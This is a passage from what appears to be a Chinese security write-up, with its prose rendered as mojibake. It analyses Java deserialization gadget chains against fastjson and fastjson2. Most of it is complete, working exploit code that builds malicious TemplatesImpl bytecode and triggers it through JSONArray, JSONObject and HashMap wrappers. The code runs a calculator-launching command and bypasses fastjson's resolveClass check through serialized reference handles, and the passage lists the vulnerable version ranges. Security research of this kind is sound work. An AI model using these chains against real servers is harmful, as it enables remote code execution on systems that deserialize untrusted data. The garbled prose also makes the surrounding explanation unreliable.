è¿™é‡Œä¼šè°ƒç”¨åˆ°JSONArrayç±»çš„get()æ–¹æ³•ï¼š\nä¹Ÿå°±æ˜¯è·å–ç›¸å¯¹åº”å­˜å‚¨å€¼çš„æ“ä½œï¼Œç„¶åæœ‰è¿›è¡Œåºåˆ—åŒ–çš„æ“ä½œï¼š\nå…·ä½“æ˜¯å“ªä¸ªè¿˜ä¸çŸ¥é“ï¼Œç°åœ¨åŒæ ·å¯ä»¥å°è¯•æ„é€ å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONArray; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonArray); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } è¿è¡Œåå¼¹å‡ºè®¡ç®—æœºï¼Œè°ƒè¯•è¿‡åè¿‡ç¨‹åŸºæœ¬ç›¸åŒï¼Œæœ€ååºåˆ—åŒ–ç›¸å…³å˜é‡çš„åœ°æ–¹åœ¨ï¼š\nâ€”â€”â€”â€”\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šé¢ä¸¤æ¡é“¾å­ä¹Ÿèƒ½æ‰“fastjson2ç‰ˆæœ¬ï¼Œåœ¨mavenä»“åº“ä¸Šçœ‹ç›®å‰æœ€æ–°çš„fastjsonç‰ˆæœ¬ä¸º2.0.57ï¼Œç»æµ‹è¯•fastjson2ç‰ˆæœ¬\u0026lt;=2.0.26èƒ½æ‰“ï¼Œä»2.0.27å¼€å§‹è¢«ä¿®å¤äº†ï¼Œä¾èµ–å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.26\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; æµ‹è¯•æ”¹ä¸€ä¸‹ç‰ˆæœ¬å³å¯ã€‚\nfastjson\u0026gt;=1.2.49 è¿™éƒ¨åˆ†çš„ç»•è¿‡åˆ†æå…·ä½“å¯çœ‹y4å¸ˆå‚…çš„æ–‡ç« ï¼Œéå¸¸æ¸…æ¥šäº†ï¼Œç®€å•è®°å½•ä¸€ä¸‹ã€‚\næ³¨æ„æ”¹ä¾èµ–ç‰ˆæœ¬ï¼Œä¾èµ–å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.49\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; åœ¨fastjson1ä¸­ï¼Œä»1.2.49ç‰ˆæœ¬å¼€å§‹ç›¸æ¯”fastjson1\u0026lt;=1.2.48ç‰ˆæœ¬çš„åˆ©ç”¨ç±»æœ‰äº†æ”¹å˜ï¼Œå°±JSONObjectå’ŒJSONArrayç±»æ¥è¯´ï¼Œåœ¨è¿™ä¸ªç‰ˆæœ¬è¿‡åéƒ½æ·»åŠ äº†è‡ªå¸¦çš„readObject()æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨çš„æ–¹æ³•ã€‚\nJSONArrayç±»çš„readObject()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 private void readObject(final java.io.ObjectInputStream in) throws IOException, ClassNotFoundException { JSONObject.SecureObjectInputStream.ensureFields(); if (JSONObject.SecureObjectInputStream.fields != null \u0026amp;\u0026amp; !JSONObject.SecureObjectInputStream.fields_error) { ObjectInputStream secIn = new JSONObject.SecureObjectInputStream(in); secIn.defaultReadObject(); return; } in.defaultReadObject(); for (Object item : list) { if (item != null) { ParserConfig.global.checkAutoType(item.getClass().getName(), null); } } } JSONObjectç±»çš„readObject()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 private void readObject(final java.io.ObjectInputStream in) throws IOException, ClassNotFoundException { SecureObjectInputStream.ensureFields(); if (SecureObjectInputStream.fields != null \u0026amp;\u0026amp; !SecureObjectInputStream.fields_error) { ObjectInputStream secIn = new SecureObjectInputStream(in); secIn.defaultReadObject(); return; } in.defaultReadObject(); for (Entry entry : map.entrySet()) { final Object key = entry.getKey(); if (key != null) { ParserConfig.global.checkAutoType(key.getClass().getName(), null); } final Object value = entry.getValue(); if (value != null) { ParserConfig.global.checkAutoType(value.getClass().getName(), null); } } } ä»è¿™ä¸¤ä¸ªreadObject()æ–¹æ³•ä¸­ï¼Œå¯ä»¥çœ‹å‡ºæ¥åœ¨ååºåˆ—åŒ–æ—¶éƒ½ä¼šå§”æ‰˜ç»™SecureObjectInputStreamç±»è¿›è¡Œå¤„ç†ï¼Œè¿™ä¸ªç±»é‡å†™äº†resolveClass()æ–¹æ³•ï¼š\nè¿™é‡Œå°±æ˜¯è°ƒç”¨äº†checkAutoType()æ–¹æ³•æ¥è¿›è¡Œå¯¹ååºåˆ—åŒ–ç±»çš„æ£€æµ‹ï¼Œè¿™ä¸ªcheckAutoType()æ–¹æ³•æˆ‘ä»¬å·²ç»å¾ˆç†Ÿæ‚‰äº†ï¼Œå¹¶ä¸”è¿™é‡Œfastjsonçš„ç‰ˆæœ¬æ˜¯1.2.49ï¼Œä½†æ˜¯åŒæ ·æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œè¿™é‡Œçš„ååºåˆ—åŒ–è¿‡ç¨‹å¯ä»¥çœ‹æˆå¦‚ä¸‹ï¼š\n1 ObjectInputStream -\u0026gt; readObject... -\u0026gt; SecureObjectInputStream -\u0026gt; readObject -\u0026gt; resolveClass åœ¨å‰é¢çš„åˆ†æä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸»è¦çš„æ£€æµ‹é€»è¾‘å°±æ˜¯åœ¨resolveClass()æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦çŸ¥é“çš„æ˜¯ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¸æ˜¯æ‰€æœ‰çš„ååºåˆ—åŒ–æ—¶éƒ½ä¼šè°ƒç”¨resolveClass()æ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨ä¸€ä¸ªç»•è¿‡æ–¹æ³•ï¼Œå¯ä»¥å¯»æ‰¾ä»€ä¹ˆæƒ…å†µä¸‹ä¸ä¼šè°ƒç”¨resolveClass()æ–¹æ³•ï¼Œä»è€Œå¯ä»¥ç»•è¿‡è¿™ä¸ªæ£€æµ‹ã€‚\nåœ¨java.io.ObjectInputStream#readObject0çš„è°ƒç”¨ä¸­ï¼Œä¼šæ ¹æ®è¯»åˆ°çš„bytesä¸­tcçš„æ•°æ®ç±»å‹åšä¸åŒçš„å¤„ç†æ¥è¿›è¡Œå¯¹è±¡çš„ååºï¼š\néƒ¨åˆ†å¦‚ä¸Šï¼Œè¿™é‡Œæˆ‘ä»¬è¦åˆ©ç”¨åˆ°çš„å°±æ˜¯å›¾ä¸­æ ‡æ³¨å‡ºæ¥çš„TC_REFERENCEç±»å‹çš„å¤„ç†ï¼Œä»åç§°ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œå°±æ˜¯è¦å¤„ç†å¼•ç”¨ç±»å‹çš„æ•°æ®ï¼Œå¯¹äºresolveClass()æ–¹æ³•çš„è°ƒç”¨è¿‡ç¨‹ï¼Œä»¥å¦‚ä¸‹ä»£ç ç®€å•è°ƒè¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package org.example; import java.io.*; public class AppTest { public static void main(String[] args) throws IOException, ClassNotFoundException{ Test123 test = new Test123(\u0026#34;fupanc\u0026#34;); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(test); oos.close(); ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new MyTestInputStream(bais); Test123 a = (Test123)ois.readObject(); System.out.println(a.getName()); } } class MyTestInputStream extends ObjectInputStream{ public MyTestInputStream(InputStream in) throws IOException { super(in); } protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { System.out.println(\u0026#34;just a Test\u0026#34;); return super.resolveClass(desc); } } class Test123 implements Serializable { public String name; private static final long serialVersionUID = 1L; public Test123(String name){ this.name=name; } public String getName(){ return name; } } è¿™é‡Œæˆ‘æ˜¯è‡ªå·±é‡å†™äº†ä¸€ä¸ªresolveClass()æ–¹æ³•ï¼Œè¿è¡Œåè¾“å‡ºå¦‚ä¸‹ï¼š\n1 2 just a Test fupanc å¯ä»¥çœ‹åˆ°æ˜¯æˆåŠŸè°ƒç”¨äº†resolveClass()æ–¹æ³•ï¼Œå¯¹äºè¿™é‡Œçš„ååºåˆ—åŒ–ï¼Œæ˜¯ç›´æ¥ååºåˆ—åŒ–çš„ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å¹³æ—¶æ¯”è¾ƒå¸¸ç”¨çš„ç‚¹ï¼Œæ‰“æ–­ç‚¹äºreadObject()æ–¹æ³•ï¼Œç„¶åå¼€å§‹è°ƒè¯•ï¼š\nè·Ÿè¿›è¿™é‡Œçš„readObject0()æ–¹æ³•ï¼Œç„¶ååˆ°switchéƒ¨åˆ†ï¼Œä¼šåŒ¹é…åˆ°TC_OBJECTç±»å‹ï¼š\nè·Ÿè¿›è¿™é‡Œçš„readOrdinaryObject()æ–¹æ³•ï¼š\nå…¶å®æˆ‘ä»¬ä¸€èˆ¬ååºåˆ—åŒ–å¯¹è±¡çš„å®ä¾‹åŒ–çš„ç‚¹å°±æ˜¯ä¸‹é¢æ ‡æ³¨å‡ºæ¥çš„ï¼Œå¹¶ä¸”å¦‚æœå®ä¾‹åŒ–æˆåŠŸæœ€åè¿”å›çš„ä¹Ÿæ˜¯è¿™ä¸ªobjã€‚è¿™é‡Œæˆ‘ä»¬æ˜¯åœ¨æ‰¾resolveClass()æ–¹æ³•è°ƒç”¨éƒ¨åˆ†ï¼Œç»§ç»­è·Ÿè¿›readClassDesc()æ–¹æ³•ï¼›\nå¯ä»¥çœ‹åˆ°æ˜¯å¯¹byteå–äº†ä¸‹ä¸€ä¸ªæ•°æ®ç±»å‹ï¼Œå¦‚æœæ˜¯TC_CLASSDESCç±»å‹çš„è¯ï¼Œå°±ä¼šå†æ¬¡è°ƒç”¨readNonProxyDesc()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å†…éƒ¨å°±ä¼šæœ‰resolveClass()æ–¹æ³•çš„è°ƒç”¨ï¼š\nç”±äºå¯¹è±¡çš„å…³ç³»ï¼Œè¿™é‡Œå°±ä¼šè°ƒç”¨åˆ°æˆ‘è‡ªå®šä¹‰çš„resolveClass()æ–¹æ³•ï¼š\nç”±æ­¤å½¢æˆäº†ä¸€ä¸ªé—­ç¯ï¼Œæˆ‘è¿™é‡Œåªæ˜¯ç®€å•åˆ†æäº†ä¸€ä¸‹æµç¨‹ã€‚å¯ä»¥ç®€å•æ€»ç»“ä¸€ä¸‹å‰é¢çš„æµç¨‹ï¼Œæ¯”è¾ƒå…³é”®çš„ç‚¹å°±æ˜¯ï¼š\nreadClassDesc()æ–¹æ³•=ã€‹å¦‚æœä¸‹ä¸€ä¸ªæ•°æ®ç±»å‹æ˜¯TC_CLASSDESCå°±ä¼šè°ƒç”¨åˆ°readNonProxyDesc()æ–¹æ³•=ã€‹resolveClass()æ–¹æ³•\nç„¶åçœ‹å‰é¢çš„readObject0()æ–¹æ³•çš„ä¸åŒæ•°æ®ç±»å‹å¯¹åº”è°ƒç”¨çš„ä¸åŒæ–¹æ³•ï¼Œå¤§éƒ¨åˆ†ç±»å‹æ‰€éœ€è¦çš„æ–¹æ³•éƒ½æ˜¯ä¼šreadClassDesc()æ–¹æ³•çš„ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯ä¼šæœ‰ä¸€å®šæ¦‚ç‡ä¼šè°ƒç”¨åˆ°resolveClass()æ–¹æ³•çš„ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯éœ€è¦æ‰¾ä¸€ä¸ªä¸ä¼šè°ƒç”¨readClassDesc()æ–¹æ³•æ–¹æ³•çš„æ•°æ®ç±»å‹ï¼Œè¿™é‡Œæœ‰å‡ ä¸ªï¼Œä½†æ˜¯æœ‰ç”¨çš„å°±æ˜¯TC_REFERENCEç±»å‹ï¼Œè¿™ä¸ªç±»å‹å¯¹åº”çš„readHandle()æ–¹æ³•æ˜¯é€šè¿‡æ˜ å°„æ¥è·å–å¯¹è±¡çš„ï¼š\nçŠ¹è®°å¾—å‰é¢çš„TC_OBJECTç±»å‹æ˜¯å…ˆè°ƒç”¨çš„readClassDescè¿›è¡Œååºåˆ—åŒ–ç±»çš„æ£€æŸ¥ï¼Œç„¶åæ‰æ˜¯è°ƒç”¨çš„newInstance()æ–¹æ³•è¿›è¡Œçš„å®ä¾‹åŒ–ï¼Œæ‰€ä»¥è¿™é‡Œçš„å¼•ç”¨æ˜¯éå¸¸å¥½ç”¨æ¥ç»•è¿‡çš„ã€‚\næ‰€ä»¥ç°åœ¨çš„æ€è·¯å°±æ˜¯åœ¨JSONObject/JSONArrayååºåˆ—åŒ–æ—¶ï¼Œè¿›è¡Œæ£€æµ‹æ—¶ï¼Œä¸ä¼šè°ƒç”¨resolveClass()æ–¹æ³•ï¼Œä»è€Œå¯ä»¥æ¥ç»•è¿‡ï¼Œå¦‚ä½•å»ºç«‹ä»å¯¹è±¡åˆ°å¼•ç”¨çš„æ˜ å°„ï¼Œåˆ©ç”¨æ–¹æ³•å°±æ˜¯å‘Listã€setã€mapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡å°±å¯ä»¥æˆåŠŸåˆ©ç”¨ã€‚\nä»Listç±»å‹æ„é€ ä¸€ä¸ªä¾‹å­æ¥è°ƒè¯•ç†è§£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package org.example; import java.io.*; import java.util.ArrayList; import java.util.HashMap; public class AppTest { public static void main(String[] args) throws IOException, ClassNotFoundException{ Test123 test = new Test123(\u0026#34;fupanc\u0026#34;); ArrayList list = new ArrayList(); list.add(test); HashMap map = new HashMap(); map.put(\u0026#34;fupanc\u0026#34;, test); list.add(map); ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(list); oos.close(); } } class Test123 implements Serializable { public String name; private static final long serialVersionUID = 1L; public Test123(String name){ this.name=name; } public String getName(){ return name; } } åœ¨ArrayListçš„writeObjectæ‰“ä¸€ä¸ªæ–­ç‚¹ï¼Œä½¿ç”¨forå¾ªç¯æ¥è¿›è¡Œåˆ†åˆ«å¤„ç†ï¼š\né‡ç‚¹çœ‹ç¬¬äºŒæ¬¡ï¼Œåœ¨ä¸Šå›¾ä¸­çš„writeObject()æ–¹æ³•åä¼šè°ƒç”¨writeObject0()æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œæˆ‘è¿™é‡Œæœ¬åœ°æµ‹è¯•æ˜¯ä½¿ç”¨çš„HashMapæ¥å®ç°ä¸€ä¸ªå¯¹è±¡å­˜æœ‰å¦å¤–ä¸€ä¸ªå¯¹è±¡çš„æƒ…å†µï¼Œæ¨¡æ‹Ÿçš„JSONArrayçš„å­˜å‚¨ï¼Œéœ€è¦æ³¨æ„æ³¨æ„çš„æ˜¯,Hashmapè‡ªå·±æœ‰å®ç°writeObject()æ–¹æ³•ï¼š\nè¿™é‡Œçš„internalWriteEntries()æ–¹æ³•å€¼å¾—å…³æ³¨ï¼Œä¼šè¿›è¡Œå¦‚ä¸‹çš„è°ƒç”¨ï¼š\nåŒæ ·æ˜¯éå†HashMapä¸­çš„é”®å€¼å¯¹ï¼Œç„¶åè°ƒç”¨writeObject()å¯¹keyå’Œvalueéƒ½è¿›è¡Œäº†åºåˆ—åŒ–å¤„ç†ã€‚\nå›åˆ°ArrayListç±»çš„åºåˆ—åŒ–å¤„ç†æ–¹æ³•ï¼Œè¯´æ˜ä¸€ä¸‹å…³é”®ç‚¹ï¼š\næ³¨æ„ç†è§£åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œä¼šè°ƒç”¨åˆ°HashMapç±»çš„writeObject()ï¼Œä¹Ÿæ˜¯å‰é¢æè¿‡çš„ï¼š\nè¿™é‡Œæˆ‘å‘ç°ä¸€ä¸ªä¸œè¥¿ï¼Œä¼¼ä¹è¿™é‡Œå¯¹äºä¸€ä¸ªå€¼çš„å­˜å‚¨ï¼Œå¦‚æœå‰åæ”¾å…¥æœ‰ç›¸åŒçš„ç±»å‹çš„å€¼ï¼Œéƒ½ä¼šä½¿ç”¨å¼•ç”¨æ¥è¿›è¡Œæ˜ å°„ï¼Œæˆ‘ä¸Šé¢çš„æµ‹è¯•ä»£ç ä¸­ï¼Œæ˜¯æ”¾å…¥äº†ä¸¤ä¸ªString.classç±»å‹çš„\u0026quot;fupanc\u0026quot;ç±»å‹çš„å˜é‡ï¼Œå‘ç°è¿™é‡Œè¿˜æ˜¯ä¼šå†™æˆå¼•ç”¨ç±»å‹ï¼š\nå› ä¸ºéƒ½æ˜¯Stringç±»å‹ï¼Ÿæ‰€ä»¥ä¼šç”¨å¼•ç”¨Test123ä¸­çš„nameï¼Ÿå¹¶ä¸”æˆ‘è®²æ”¾å…¥çš„é”®å€¼å¯¹æ”¹æˆ\u0026quot;123\u0026quot;:Test13ï¼Œè¿™æ ·å°±åªä¼šåœ¨Test123è¿™é‡Œæ ‡æ³¨ä¸ºå¼•ç”¨ç±»å‹ï¼Œç¨åº•å±‚äº†ï¼Œä¸æ˜¯å¾ˆç†è§£ï¼Œå¯¹äºTest123ç±»å®ä¾‹ï¼Œå°±æ˜¯æŒ‰ç…§å‰é¢çš„é¢„æœŸå†™æˆå¼•ç”¨ç±»å‹ï¼š\nwriteHandle()æ–¹æ³•ï¼š\næ‰€ä»¥è¿™é‡Œå°±å¯ä»¥å°è¯•å¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONArray; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; import java.util.ArrayList; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonArray); ArrayList list = new ArrayList(); list.add(templates); list.add(bad); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(list); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } è¿è¡ŒåæˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\næ€»ç»“æ¥è¯´è¿™é‡Œçš„è¿‡ç¨‹å°±æ˜¯ç¬¬ä¸€æ¬¡æˆåŠŸååºåˆ—åŒ–TemplatesImplç±»ï¼Œç„¶åç¬¬äºŒæ¬¡ååºåˆ—åŒ–BadAttributeValueExpExceptionç±»æ—¶ï¼Œå½“è°ƒç”¨åˆ°JSONArrayçš„readObject()æ—¶ï¼Œå½“ååºåˆ—åŒ–JSONArrayä¸­çš„TemplatesImplç±»æ—¶ï¼Œæ­¤æ—¶çš„TemplatesImplç±»æ˜¯ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼Œä¸ä¼šè°ƒç”¨resolveClass()æ–¹æ³•ï¼Œä»è€ŒæˆåŠŸç»•è¿‡ã€‚\nJSONObjectåŒæ ·çš„é“ç†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONArray; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; import java.util.ArrayList; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonObject); ArrayList list = new ArrayList(); list.add(templates); list.add(bad); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(list); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } é‚£ä¹ˆå¯¹äºmapç±»å‹ï¼Œè¿™é‡Œå°±ç›´æ¥ä½¿ç”¨Hashmapå³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import javax.management.BadAttributeValueExpException; import com.alibaba.fastjson.JSONArray; import com.alibaba.fastjson.JSONObject; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.*; import java.lang.reflect.Field; import java.util.ArrayList; import java.util.HashMap; public class Main{ public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;,templates); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); Field field = bad.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(bad, jsonObject); HashMap hashMap = new HashMap(); hashMap.put(templates,bad); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } å…·ä½“è¿‡ç¨‹å…¶å®å‰é¢ä¹Ÿè¯´äº†ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¼šåˆ†åˆ«å¯¹keyå’Œvalueè¿›è¡ŒwriteObject()å¤„ç†ï¼š\næ‰€ä»¥æˆ‘è¿™é‡Œçš„å¤„ç†æ–¹å¼æ˜¯ï¼š\n1 2 HashMap hashMap = new HashMap(); hashMap.put(templates,bad); 